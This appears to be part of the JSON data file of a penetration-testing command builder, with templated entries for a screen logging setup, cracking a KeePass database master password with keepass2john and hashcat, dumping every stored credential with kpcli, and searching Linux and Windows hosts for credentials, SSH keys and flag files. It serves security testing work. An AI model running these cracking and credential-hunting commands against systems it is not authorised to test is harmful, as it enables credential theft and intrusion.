        "cmd": "__CUSTOM_SCREEN_LOGGING_ZSHRC__ __CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
        "help": "# Setup - Run Once\n\nThese setup commands help get started with this customized `screen` configuration with the python `logs.py` which requires additional non-standard packages for kali to run correctly.",
        "code": [
          {
            "data": "",
            "filename": "logs.py",
            "sha256": "b5fc732270918d8c258969cc71d97de9886c8f431ced1266e3711136df233ae0"
          },
          {
            "data": "IyEvYmluL2Jhc2gKCiMgY3VzdG9tIGFsaWFzIGZvciBsYXVuY2hpbmcgdGhlIHB5dGhvbiBsb2dzIHNjcmlwdDoKYWxpYXMgcHlfbG9ncz0icHl0aG9uIC9ob21lL2thbGkvbG9ncy5weSIKCiMgQ3VzdG9tIGZuIGZvciBTY3JlZW4gTG9nZ2luZyAoc2xvZykKIyBGdW5jdGlvbiB0byBleGVjdXRlIGJlZm9yZSBlYWNoIGNvbW1hbmQgd2l0aCB5b3VyIGNvbW1hbmQgYXMgYXJndW1lbnQKIyBjdXN0b21pemVkIHRvIHByaW50IGEgdGltZXN0YW1wIGFuZCB0aGUgY29tbWFuZCB0byBiZSBlYXNpbHkgZ3JhYmJlZCBmcm9tIGxvZyBmaWxlcy4KIyBzaG91bGQgbWFzc2l2ZWx5IHNpbXBsaWZ5IHNjcmVlbiBsb2dnaW5nIGFuZCByZXBvcnQgd3JpdGluZwpmdW5jdGlvbiBwcmVleGVjKCkgewogICAgX2N1c3RvbV90aW1lc3RhbXA9IltjbWRfVFM6JChkYXRlICcrJXMgJXkvJW0vJWQgJVQnKV0gJDEgWy9jbWRfVFNdIgoKIyBOT1RFOiBwcmludHMgd2l0aCBjb2xvciBBTkQgcHJlc2VydmVzIGFueSBlc2NhcGUgc2VxdWVuY2luZyB0aGUgdXNlciBoYXMgaW5wdXQKICAgIHByaW50IC1uUCAiJUZ7Z3JlZW59IgogICAgcHJpbnQgLXJuICIkX2N1c3RvbV90aW1lc3RhbXAiCiAgICBwcmludCAtUCAiJWYiCn0KCiMgY3VzdG9tIHNjcmVlbiBzdGFydGVyIGZ1bmN0aW9uCm5ld19zY3JlZW4oKXsKICBpZiBbIC16ICIkMSIgXSB8fCBbICIkMSIgPSAiLWgiIF0gfHwgWyAiJDEiID0gIi0taGVscCIgXTsgdGhlbgogICAgZWNobyAibmV3X3NjcmVlbiBoZWxwOiIKICAgIGVjaG8gIlVzYWdlOiBuZXdfc2NyZWVuIFNFU1NJT05fTkFNRSIKICAgIGVjaG8gIiIKICAgIGVjaG8gIkhlbHA6IgogICAgZWNobyAiICAgIC1oLCAtLWhlbHAiCiAgICBlY2hvICIiCiAgICBlY2hvICJSZXF1aXJlZCBBcmdzOiIKICAgIGVjaG8gIiAgICBTRVNTSU9OX05BTUUgICAgICAgICAgICAgVGhlIG5hbWUgdXNlZCBmb3IgdGhlIHNjcmVlbiBzZXNzaW9uIGFuZCB3aXRoaW4iCiAgICBlY2hvICIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGUgbG9nIGZpbGUgbmFtZXMgb2YgcGF0dGVybiAnc2xvZ3tTRVNTSU9OX05BTUV9LntMT0dfTlVNQkVSfSciCiAgICBlY2hvICIiCgogICAgcmV0dXJuIDEKICBmaQoKICBsb2NhbCBfc2NyZWVucmM9JChjYXQgPDwgRU9GCiMgc3RhcnQgc2NyZWVuIGNvbmZpZwojIGVuYWJsZSBsb25nZXIgc2Nyb2xsYmFjawpkZWZzY3JvbGxiYWNrIDEwMDAwCgojIEJVRzogdGhpcyBkb2VzIGFsbG93IHJlZ2lvbiBzd2l0Y2hpbmcsIGJ1dCBraWxscyBzY3JvbGxpbmcgYWZ0ZXIgQ3RybCtFc2MgY29weSBtb2RlLCBhbmQgTU9VU0UgVEVYVCBTRUxFQ1RJT04gZmZzCiMgbW91c2UgdHJhY2tpbmcgYWxsb3dzIHRvIHN3aXRjaCByZWdpb24gZm9jdXMgYnkgY2xpY2tpbmcKI21vdXNldHJhY2sgb24KCiMgZ2l2ZSBhIHNlc3Npb24gbmFtZQpzZXNzaW9ubmFtZSBfX1NFU1NJT05fTkFNRV9fCgojIHR1cm4gb24gbG9nZ2luZyB0byBmaWxlcwpkZWZsb2cgb24KbG9nZmlsZSBzbG9nX19TRVNTSU9OX05BTUVfXy4lbgoKIyBhdHRlbXB0IHRvIHNhdmUgdGhlIHdpbmRvd3Mgd2hlbiBkZXRhY2hpbmcgdG8gYWxsb3cgcmVhdHRhY2hpbmcgaW4gdGhlIHNhbWUgdmlldwpsYXlvdXQgc2F2ZSBkZWZhdWx0CgojIGtleSBiaW5kaW5ncyAoY2FuIGFsc28gY3JlYXRlICdjb21tYW5kcycgdGhhdCBhcmUgdXNlZCB3aXRoaW4gdGhlIEN0cmwtYSA6IGlucHV0ISkKIyMgQ3RybC1TcGFjZSB0byBsaXN0IHdpbmRvd3MKYmluZGtleSBedCB3aW5kb3dsaXN0CiMjIHdpbmRvdyBmb2N1cyBtb3ZpbmcKYmluZCBoIGZvY3VzIGxlZnQKYmluZCBqIGZvY3VzIGRvd24KYmluZCBrIGZvY3VzIHVwCmJpbmQgbCBmb2N1cyByaWdodApiaW5kIHQgZm9jdXMgdG9wCmJpbmQgYiBmb2N1cyBib3R0b20KCiMgZGVmaW5lIHRoZSBkZWZhdWx0IHNjcmVlbiB3aW5kb3dzIHRvIG9wZW4gaGVyZToKIyB0b3AtbGVmdCBwYW5lCnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjAgMApzcGxpdApmb2N1cyBib3R0b20KcmVzaXplIC12IDQKZm9jdXMgdXAKCiMgdG9wLXJpZ2h0IHBhbmUKc3BsaXQgLXYKZm9jdXMgcmlnaHQKc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMSAxCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMiAyCnNwbGl0CmZvY3VzIGRvd24Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luMyAzCgoKIyBib3R0b20gcGFuZQpmb2N1cyBib3R0b20Kc2NyZWVuIC10IF9fU0VTU0lPTl9OQU1FX18ud2luNCA0CnNwbGl0IC12CmZvY3VzIHJpZ2h0CnNjcmVlbiAtdCBfX1NFU1NJT05fTkFNRV9fLndpbjUgNQpzcGxpdCAtdgpmb2N1cyByaWdodApzY3JlZW4gLXQgX19TRVNTSU9OX05BTUVfXy53aW42IDYKCiMgZm9jdXMgdG8gdGhlIGZpcnN0IHBhbmUKZm9jdXMgdG9wCmZvY3VzIGxlZnQKCiNlbmQgc2NyZWVuIGNvbmZpZwpFT0YKKQogIGxvY2FsIHNlc3NfbmFtZT0kMQogIGxvY2FsIHRlbXBfZmlsZT0kKG1rdGVtcCkKICAjIG91dHB1dCB0aGUgdGVtcG9yYXJ5IGZpbGUgb2YgdGhlIHNjcmVlbnJjIHZhcmlhYmxlIGFib3ZlLAogICMgcmVwbGFjaW5nIHRoZSBfX1NFU1NJT05fTkFNRV9fIHN0cmluZyB3aXRoIHRoZSBzdXBwbGllZCB2YWx1ZSBhcyB0aGUgZmlyc3QgYXJnCiAgZWNobyAiJF9zY3JlZW5yYyIgfCBzZWQgInMvX19TRVNTSU9OX05BTUVfXy8kc2Vzc19uYW1lL2ciID4gJHRlbXBfZmlsZQogIHNjcmVlbiAtYyAkdGVtcF9maWxlCiAgcm0gJHRlbXBfZmlsZQp9",
            "filename": "custom_screen_logging.sh",
            "sha256": "e21c0de1c90c862e38af38508a28072a8b48b990f795e0b3ed153f6c77a8f959"
          }
        ],
        "config": [
          {
            "help": "Enable the command to add some text to the `~/.zshrc` file.\n\nSpecifically adds a line to `source` the `custom_screen_logging.sh` file which contains the necessary functions and setup for adding a GNU screen logging setup to your machine.",
            "replace": "__CUSTOM_SCREEN_LOGGING_ZSHRC__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Add source line to ~/.zshrc file (only run this once!)",
              "replaceValue": "echo 'source ~/custom_screen_logging.sh' >> ~/.zshrc ;"
            }
          },
          {
            "help": "Enables the necessary command to install a package required for processing logs without having the ansi codes causing issues.\n\nFor background, `screen` logs will contain all of the ansi codes that are interpreted by the terminal. Ansi codes control things like displaying text as a specific color among many other features of the terminal. To get to the raw plaintext of the logs, a 3rd party package is used to properly 'render' these ansi codes. Without this the `logs.py` file will not run correctly and the end-user experience will be unpleasant.",
            "replace": "__CUSTOM_SCREEN_LOGGING_APT_INSTALL__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable apt install ansifilter package for logs.py",
              "replaceValue": "sudo apt install ansifilter ;"
            }
          }
        ]
      }
    ]
  },
  {
    "id": "keepass-kdbx",
    "keywords": [
      "keepass",
      "kdbx",
      "master password",
      "hashcat",
      "keepass2john",
      "kpcli"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Cracking KeePass KDBX Master Password",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__KDBX_CRACKING_STEP__",
        "help": "# KeePass KDBX Files\n\n`*.kdbx` Keepass Databases can have their master password cracked and then with that info, the `kdbx` file can be opened within linux using a tool called `kpcli`\n\n## Requirements\n\n1. `*.kdbx` file eg `Database.kdbx`\n2. computer that can run `hashcat`",
        "code": [],
        "config": [
          {
            "help": "# KeePass KDBX Files\n\nThese can have their master password cracked and then with that info, the kdbx file can be opened within linux.\n\n## Cracking the Master Password - the Basics\n\nCracking is accomplished in only a few steps:\n\n1. get the hash for the master password from the `*.kdbx` file\n2. run the hash file through `hashcat` until it's cracked with various wordlists and rules\n3. once cracked, use the master password to open the `*.kdbx` file and obtain any credentials stored within",
            "replace": "__KDBX_CRACKING_STEP__",
            "defaultValue": "keepass2john __KDBX_FILENAME__ > __KEEPASS_HASH_FILENAME__",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "keepass2john __KDBX_FILENAME__ > __KEEPASS_HASH_FILENAME__",
                  "label": "Step 1: Get hash hashcat format"
                },
                {
                  "replace": "hashcat --username -m 13400 __KEEPASS_HASH_FILENAME__ __CRACKING_WORDLIST__ -r __CRACKING_RULES__",
                  "label": "Step 2: run Hashcat"
                }
              ],
              "label": "Steps to cracking a kdbx master password"
            }
          },
          {
            "help": "The KDBX filename with which to attempt opening, cracking and other operations.\n\n> TIP: This could be a relative filepath as well",
            "replace": "__KDBX_FILENAME__",
            "defaultValue": "Database.kdbx",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "Filename of KDBX file" }
          },
          {
            "help": "The Hash filename is used to store the master password hash in a format used for cracking via hashcat. \n\nThis filename can have any extension, even a blank one. Typically it's suggested to use a common one like `txt` or something more contextually specific like `hash`.\n\nWARNING: Do not modify this file as it could cause hashcat to fail to execute properly.",
            "replace": "__KEEPASS_HASH_FILENAME__",
            "defaultValue": "keepass.hash",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "Hash Filename" }
          },
          {
            "help": "Wordlists are very useful when cracking as typically passwords are built by people and not auto-generated. This means that a person will pick something memorable and often that means something common. Wordlists are collection of some of these common phrases or passwords.\n\n`rockyou.txt` is a classic wordlist and if a password is cracked with this list it generally will mean the strength of the password is very weak or simply very common and should be changed!\n\nThe wordlists in this selection are the more commonly used lists. Feel free to edit this value with a path to a custom list.",
            "replace": "__CRACKING_WORDLIST__",
            "defaultValue": "/usr/share/wordlists/rockyou.txt",
            "props": {
              "type": "select",
              "label": "Select a wordlist for cracking",
              "customInput": true,
              "options": ["/usr/share/wordlists/rockyou.txt"]
            }
          },
          {
            "help": "Rules based cracking is a very powerful way to ensure extra permutations on each wordlist entry, while reducing disk storage and other resources.\n\nThe rules files suggested here are some of the more common rules files that find common ways people change passwords to 'enhance' their strength.",
            "replace": "__CRACKING_RULES__",
            "defaultValue": "/usr/share/hashcat/rules/best64.rule",
            "props": {
              "type": "select",
              "label": "Select a cracking rules file",
              "customInput": true,
              "options": [
                "/usr/share/hashcat/rules/best64.rule",
                "/usr/share/hashcat/rules/rockyou-30000.rule"
              ]
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "Open KeePass kdbx on Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": false,
        "allowProxychains": false,
        "cmd": "__KPCLI_STEP__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "",
            "replace": "__KPCLI_STEP__",
            "defaultValue": "kpcli",
            "props": {
              "type": "radio",
              "options": [
                { "replace": "kpcli", "label": "Step 1. run kpcli" },
                {
                  "replace": "open __KDBX_FILENAME__",
                  "label": "Step 2. kpcli:/> open KDBX file"
                },
                { "replace": "ls", "label": "Step 3. kpcli:/> ls" },
                { "replace": "ls *", "label": "Step 4. kpcli:/> ls *" },
                {
                  "replace": "ls Database/",
                  "label": "Step 5. kpcli:/> ls Database/"
                },
                {
                  "replace": "show -a -f __KPCLI_SHOW_NUM__",
                  "label": "Step 6. kpcli:/> show -a -f NUM"
                },
                {
                  "replace": "show -a -f __KPCLI_SHOW_PATH__",
                  "label": "Step 7. kpcli:/> show -a -f Database/path"
                },
                { "replace": "quit", "label": "Step 8. kpcli:/> quit" }
              ],
              "label": "Using Kpcli on Linux"
            }
          },
          {
            "help": "The KDBX filename with which to attempt opening, cracking and other operations.\n\n> TIP: This could be a relative filepath as well",
            "replace": "__KDBX_FILENAME__",
            "defaultValue": "Database.kdbx",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "Filename of KDBX file" }
          },
          {
            "help": "`kpcli` sub-command `show` can take in a number or a path for the item to show. Both need to be enumerated to dump all creds stored in the database.\n\nStarting from `0` increment until no more creds are displayed. Then move onto the paths to dump.",
            "replace": "__KPCLI_SHOW_NUM__",
            "defaultValue": "0",
            "props": {
              "type": "number",
              "label": "Step 5. Number entry to show",
              "InputProps": { "inputProps": { "min": 0, "max": 65535 } }
            }
          },
          {
            "help": "`kpcli` sub-command `show` takes in a path value to a given entry to dump it's creds. \n\nGo through all the paths to dump all the creds. This has not been found to be able to be automated easily via `kpcli`, so this is a manual process. It's easiest to go down the list when it's visible on the screen. \n\n> NOTE: `Tab` complete on the keyboard will work, usually the starting of a path is `Database/`",
            "replace": "__KPCLI_SHOW_PATH__",
            "defaultValue": "Database/",
            "validationRegex": "",
            "validationHelp": "",
            "props": { "type": "string", "label": "Path Entry to show" }
          }
        ]
      }
    ]
  },
  {
    "id": "file-enumeration",
    "keywords": [
      "find",
      "fileenum",
      "passwords",
      "plaintext",
      "proof",
      "local",
      "flag.txt",
      "powershell",
      "gci",
      "get-childitem",
      "recurse",
      "files",
      "folders",
      "directories"
    ],
    "cmds": [
      {
        "win": 0,
        "label": "Find on Linux",
        "platform": "linux",
        "terminal": ["sh", "bash"],
        "allowTerminalWrap": true,
        "allowProxychains": false,
        "cmd": "find __FILE_SEARCH_PATH__ __LINUX_FIND_IGNORE_COMMON_PATHS__ __LINUX_FIND_ARGS__ __LINUX_FIND_OUTPUT_OPTIONS__ __LINUX_FIND_REDIRECT_ERRORS_ENABLED__",
        "help": "# Enumerating Files\n\nOften plaintext files are found containing sensitive information. Here are various ways to enumerate depending on the types of commands available on the system.\n\n## Methodology / Goals\n\n1. find credentials or other privilege escalation means such as writable files\n2. find info which describes how the environment was/is setup. with more context, often it's easier to continue attacking a network\n3. reduce noise by quickly and easily filtering out common areas that often have false positives\n4. offer redundant command options that achieve the same goal\n",
        "code": [],
        "config": [
          {
            "help": "Select a find option and enter any additional configuration needed for it before running.\n\nAvailable options are to help guide towards important files, sensitive data and other interesting info. These are considered a list of commands to start with, before diving into more context specific searches.\n\nTIP: Consider also using a tool like `linpeas` to find even more.",
            "replace": "__LINUX_FIND_ARGS__",
            "defaultValue": "-type f \\( -name '*proof*.txt' -o -name '*local*.txt' -o -name '*flag*.txt' \\)",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-type f \\( -name '*proof*.txt' -o -name '*local*.txt' -o -name '*flag*.txt' \\)",
                  "label": "Find txt files with \"proof\", \"local\" or \"flag\" in the filename"
                },
                {
                  "replace": "-type d -name '.ssh' -o -name '.git'",
                  "label": "Find all \".ssh\" or \".git\" folders"
                },
                { "replace": "-type f", "label": "Find ALL files" },
                { "replace": "-type d", "label": "Find ALL directories" },
                {
                  "replace": "\\! -user root",
                  "label": "Find all files NOT owned by root"
                },
                {
                  "replace": "-type f -name '__LINUX_FIND_NAME_PATTERN__'",
                  "label": "Find files matching a name or pattern"
                }
              ],
              "label": "Find Options"
            }
          },
          {
            "help": "# Where to search?\n\nWHERE should the searching take place? Often, searching from the root of the current filesystem is desired however this can cause the search to be slow and create too much output to easily sift through.\n\nEnter a path on the filesystem to search. Consider common locations like `/` or `/home/`",
            "replace": "__FILE_SEARCH_PATH__",
            "defaultValue": "/",
            "props": {
              "type": "select",
              "label": "File Search Path",
              "customInput": true,
              "options": ["/", "/home/"]
            }
          },
          {
            "help": "When checked this command will have all `stderr` output redirected to `/dev/null`. This makes the command output easier to read. Common `stderr` output is related to access denied messages for a given location.\n\nDefault is to have this enabled.",
            "replace": "__LINUX_FIND_REDIRECT_ERRORS_ENABLED__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Redirect errors to /dev/null",
              "replaceValue": "2>/dev/null"
            }
          },
          {
            "help": "Ignoring these paths is often ideal as they are owned by root, contain system data and often lead to a large list of false-positives.\n\nThis uses `grep -v` which will NOT output anything matching the pattern. The patterns used contain a regex `^` (caret) which ensure the match happens at the beginning of the line. This is desired as the folders are located at the root of the filesystem.",
            "replace": "__LINUX_FIND_IGNORE_COMMON_PATHS__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Ignore common false-positive paths",
              "replaceValue": "-type d \\( -path '/run/' -o -path '/proc/' -o -path '/sys/' \\) -prune -o"
            }
          },
          {
            "help": "Pick an option of what to output during the operation. When first enumerating, it's a good idea to look at filenames to determine potential sensitivity. A file named `passwords.txt` is often of interest, however not all files will be named something interesting.\n\nWhen more verbosity is desired, consider selecting an option that also outputs the file contents when they are found.",
            "replace": "__LINUX_FIND_OUTPUT_OPTIONS__",
            "defaultValue": "-print",
            "props": {
              "type": "radio",
              "options": [
                { "replace": "-print", "label": "Print full file path" },
                {
                  "replace": "-print -exec cat \"{}\" \\;",
                  "label": "Print full file path AND file contents"
                }
              ],
              "label": "Select output options (print path and contents)"
            }
          },
          {
            "help": "Finding files based on their filename with a pattern is very powerful.\n\nSome common uses are:\n\n1. finding all files of a given extension eg `*.txt` to find all files with the extension of `.txt`\n2. finding all files containing a string in their name eg `*proof*` to find all files with the word `proof` in the filename\n\n> NOTE: this is inserted between single quotes, escape appropriately",
            "replace": "__LINUX_FIND_NAME_PATTERN__",
            "defaultValue": "*.txt",
            "props": {
              "type": "select",
              "label": "Find filename pattern",
              "customInput": true,
              "options": ["*.txt", "*.sh", "*.pub", "id_*", "*.kdbx", "*.py"]
            }
          }
        ]
      },
      {
        "win": 0,
        "label": "PowerShell Get-ChildItem",
        "platform": "windows",
        "terminal": ["ps", "cmd"],
        "allowTerminalWrap": true,
        "allowProxychains": true,
        "cmd": "Get-ChildItem __GCI_SILENT_ERRORS__ __GCI_FORCE_HIDDEN__ __GCI_SEARCH_ARGS__",
        "help": "",
        "code": [],
        "config": [
          {
            "help": "This list of options contains some common search tasks. The main goals are:\n\n1. find sensitive information eg credentials\n2. find other interesting files eg privilege escalation possibilities",
            "replace": "__GCI_SEARCH_ARGS__",
            "defaultValue": "-Recurse -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" -File",
            "props": {
              "type": "radio",
              "options": [
                {
                  "replace": "-Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" __GCI_PRINT_FULLPATH_COMPACT__",
                  "label": "Custom Search"
                },
                {
                  "replace": "-Recurse -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\" -File",
                  "label": "(Recurse) Find files via FILTER (eg, *.kdbx)"
                },
                {
                  "replace": "-Path C:\\ -Directory | Where-Object {$_.Name -notin @('$Recycle.Bin','$WinREAgent','Documents and Settings','PerfLogs','Program Files','Program Files (x86)','ProgramData','Recovery','System Volume Information','Users','Windows')} | foreach-object { $_.FullName }",
                  "label": "List any non-standard C:\\ directories"
                },
                {
                  "replace": "-Path __GCI_SEARCH_PATH__ -Directory -Recurse | Where-Object {$_.Name -eq '.git' -or $_.Name -eq '.ssh'} | foreach-object { $_.FullName }",
                  "label": "(Recurse) Find all .git or .ssh folders at PATH"
                },
                {
                  "replace": "-Recurse -File -Path \"C:\\\" -filter \"*.exe\" | where-object {$_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Program Files \\(x86\\)' -and $_.FullName -notmatch 'C:\\\\Windows'} | foreach-object { $_.FullName }",
                  "label": "Find all *.exe files NOT in Program Files dirs"
                },
                {
                  "replace": "-Recurse -File -Path \"C:\\\" -filter \"*.txt\" | where-object {$_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Program Files \\(x86\\)' -and $_.Name -Match \"local|proof|flag\"} | foreach-object { $_.FullName; cat $_.FullName }",
                  "label": "Find all TXT files with \"proof\", \"local\" or \"flag\" in the filename. Print full path and contents"
                },
                {
                  "replace": "-Path C:\\Users\\ -Include \"__GCI_INCLUDE_FILTER__\" -File -Recurse | foreach-object { $_.FullName }",
                  "label": "(Recurse) Enumerate files via INCLUDE FILTER in the PATH"
                },
                {
                  "replace": "-Recurse -File -Path __GCI_SEARCH_PATH__ -Include \"__GCI_INCLUDE_FILTER__\"  | foreach-object { $_.FullName; select-string -Path $_.FullName -pattern \"password\" -Context 1,1 }",
                  "label": "(Recurse) Search PATH for files with contents matching PATTERN (eg find \"password\" in a file)"
                },
                {
                  "replace": "-Path __GCI_SEARCH_PATH__ | Where-Object {$_.CreationTime -gt (Get-Date).AddHours(-24) -and $_.FullName -notmatch 'C:\\\\Program Files' -and $_.FullName -notmatch 'C:\\\\Program Files (x86)' -and $_.FullName -notmatch 'C:\\\\Windows'} | foreach-object { $_.FullName }",
                  "label": "(Recurse) Find all files or dirs that have been modified recently"
                }
              ],
              "label": "Select a search option"
            }
          },
          {
            "help": "Silently ignore and continue if an error such as `access denied` is encountered. This is often desired (and by default enabled) to reduce unnecessary verbosity of errors in the command output.",
            "replace": "__GCI_SILENT_ERRORS__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable silent errors (eg, suppress access denied error output)",
              "replaceValue": "-ErrorAction SilentlyContinue"
            }
          },
          {
            "help": "Where should the search take place on the hard drive? Pick carefully for certain commands as searching the entire drive can take a long time - albeit with the best potential results as well as the most chance for false-positives.",
            "replace": "__GCI_SEARCH_PATH__",
            "defaultValue": "C:\\Users\\",
            "props": {
              "type": "select",
              "label": "Search Path (aka file path to search)",
              "customInput": true,
              "options": ["C:\\Users\\", "C:\\", ".\\"]
            }
          },
          {
            "help": "Enabling this enables the `-Force` flag which tells Get-ChildItem to attempt finding any and all files no matter if they are hidden. This means a lot more will be searched and a lot more output is possible.\n\n> NOTE: some folders are by default hidden and this flag MUST be turned on to find them. Eg, `.git` folders are hidden by default!",
            "replace": "__GCI_FORCE_HIDDEN__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Find Hidden files and dirs",
              "replaceValue": "-Force"
            }
          },
          {
            "help": "The `-Include FILTER` allows for filtering on basic patterns. Eg, `*.*` will include ALL files found in the PATH searched (and if `-Recurse` is present, then all files are found recursively under the PATH provided)\n\nCommon extensions are provided as options to search quickly or provide your own custom input.\n\n[Powershell GCI Documentation on -Include](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem?view=powershell-7.4#-include)",
            "replace": "__GCI_INCLUDE_FILTER__",
            "defaultValue": "*.*",
            "props": {
              "type": "select",
              "label": "Search filter (eg, *.kdbx includes all files with kdbx extension)",
              "customInput": true,
              "options": [
                "*.*",
                "*.kdbx",
                "*.txt",
                "*.py",
                "*.pub",
                "*.ps1",
                "*.bat",
                "*.exe"
              ]
            }
          },
          {
            "help": "This will append some PowerShell code that will print out the full path of the given items found. This is already included on many of the commands, however it's optional on the Custom Search option.\n\n```powershell\n# adds to the Get-ChildItem command (aka GCI) :\nGCI ... | foreach-object { $_.FullName }\n\n\n```",
            "replace": "__GCI_PRINT_FULLPATH_COMPACT__",
            "defaultValue": true,
            "props": {
              "type": "checkbox",
              "label": "Enable compact full path output for CUSTOM commands",
              "replaceValue": "| foreach-object { $_.FullName }"
            }
          }
        ]
      }
    ]
  }
]
